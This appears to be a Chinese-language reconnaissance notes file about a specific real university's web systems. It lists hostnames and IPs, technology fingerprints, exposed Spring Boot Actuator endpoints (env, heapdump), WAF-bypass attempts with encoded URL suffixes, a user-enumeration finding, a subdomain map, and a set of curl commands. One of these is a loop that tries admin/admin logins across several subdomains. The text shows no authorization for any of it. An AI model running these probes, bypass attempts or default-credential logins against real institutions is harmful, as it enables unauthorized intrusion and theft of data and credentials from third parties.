# 南京医科大学康达学院 (NJMU) 测试模式 (2026-05)

## 目标信息
- 主站: kdc.njmu.edu.cn (202.195.176.21)
- ehall: ehall.nmukd.edu.cn (198.18.0.38)
- authserver: authserver.nmukd.edu.cn
- 系统: SUDY网站管理平台 + 金智教育(wisedu) CAS + Spring Boot
- WAF: ehall有WAF拦截Actuator

## 技术栈指纹
```
kdc.njmu.edu.cn:
  nginx 1.21.5 (Server头隐藏: ******)
  SUDY WebPlus CMS (sudy-wp-siteId)
  X-Frame-Options: SAMEORIGIN

ehall.nmukd.edu.cn:
  Server: wisedu (金智教育)
  Spring Boot Actuator (暴露)
  CAS统一身份认证

authserver.nmukd.edu.cn:
  Server: wisedu
  CAS协议 (serviceValidate/proxyValidate)
  SM2加密 (encrypt.js)
```

## 关键发现

### 1. ehall Spring Boot Actuator暴露 (中危)
```
http://ehall.nmukd.edu.cn/actuator → 200
http://ehall.nmukd.edu.cn/actuator/health → 200
http://ehall.nmukd.edu.cn/actuator/env → 200
http://ehall.nmukd.edu.cn/actuator/mappings → 200
http://ehall.nmukd.edu.cn/actuator/beans → 200
http://ehall.nmukd.edu.cn/actuator/configprops → 200
http://ehall.nmukd.edu.cn/actuator/loggers → 200
http://ehall.nmukd.edu.cn/actuator/heapdump → 200

WAF拦截: 直接访问返回"访问禁止" + 事件编号
URL编码绕过: /actuator/env%0a, %09, %0d, %20, %00, %2f, %2e → 200
但内容仍被WAF拦截
```

### 2. CAS认证服务器信息泄露 (中危)
```
authserver.nmukd.edu.cn/authserver/login
泄露:
- Server: wisedu (金智教育平台)
- 其他学校: authserver.xzhmu.edu.cn/personalInfo
- CAS端点: /serviceValidate, /proxyValidate
- 登录方式: 账号/手机/二维码/生物识别
```

### 3. CAS用户枚举 (中危)
```
POST /authserver/login → "您的账号尚未激活，请激活后登录！"
所有用户名返回相同信息(用于确认用户存在)
```

### 4. SUDY CMS错误页面泄露IP (中危)
```
/_web/_portal/api/user/main.psp
→ <input id="ipAddress" value="61.139.70.105"/>
```

### 5. 8080端口Spring Boot Actuator (低危)
```
http://kdc.njmu.edu.cn:8080/actuator → 200
http://kdc.njmu.edu.cn:8080/actuator/health → 503 {"status":"DOWN"}
```

## SUDY CMS关键路径
```
/_web/_ids/login/api/login/create.rst → IDS登录API (POST)
/_web/_ids/login/api/logout/create.rst → IDS登出API
/_web/_portal/api/user/main.psp → Portal用户API
/_web/_portal/api/login/main.psp → Portal登录API
/_web/_portal/api/config/main.psp → Portal配置API
/_web/_portal/api/system/main.psp → Portal系统API
/_web/_search/api/search/new.rst → 搜索API
/_admin/ → 403 (存在但被保护)
/admin/ → 403
/system/ → 403
/login.jsp → 200 (登录页面)
```

## 子域名枚举
```
kdc.njmu.edu.cn → 202.195.176.21 (siteId=164)
kdclib.njmu.edu.cn → 202.195.176.21 (siteId=338, 图书馆)
kdjw.njmu.edu.cn → 202.195.176.21 (siteId=169, 教务办)
kdxg.njmu.edu.cn → 202.195.176.21 (siteId=170, 学生工作处)
kdtw.njmu.edu.cn → 202.195.176.21 (siteId=162, 团委)
kdjjjc.njmu.edu.cn → 202.195.176.21 (siteId=286, 纪委)
kdgh.njmu.edu.cn → 202.195.176.21 (工会)
www.njmu.edu.cn → 202.195.176.21
mail.njmu.edu.cn → 202.195.181.187
vpn.njmu.edu.cn → 218.94.72.98
oa.njmu.edu.cn → 202.195.176.19
webvpn.njmu.edu.cn → 202.195.188.233
ids.njmu.edu.cn → 202.195.176.25
app.njmu.edu.cn → 202.195.176.38
```

## 测试命令
```bash
# SUDY CMS指纹
curl -sk https://kdc.njmu.edu.cn/ | grep -i "sudy"

# IDS登录API
curl -sk -X POST "https://kdc.njmu.edu.cn/_web/_ids/login/api/login/create.rst" \
  -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=admin"

# PSP文件测试
curl -sk "https://kdc.njmu.edu.cn/_web/_portal/api/user/main.psp"

# CAS登录
curl -sk "http://authserver.nmukd.edu.cn/authserver/login"

# Actuator测试
curl -sk "http://ehall.nmukd.edu.cn/actuator"
curl -sk "http://ehall.nmukd.edu.cn/actuator/env%0a"

# 子域名枚举
for sub in kdclib kdjw kdxg kdtw kdjjjc kdgh; do
  echo "${sub}: $(curl -sk -X POST "http://${sub}.njmu.edu.cn/_web/_ids/login/api/login/create.rst" -d "username=admin&password=admin" 2>/dev/null | tail -1)"
done
```

## 报告
- /tmp/vuln_reports/njmu/scan-report.txt
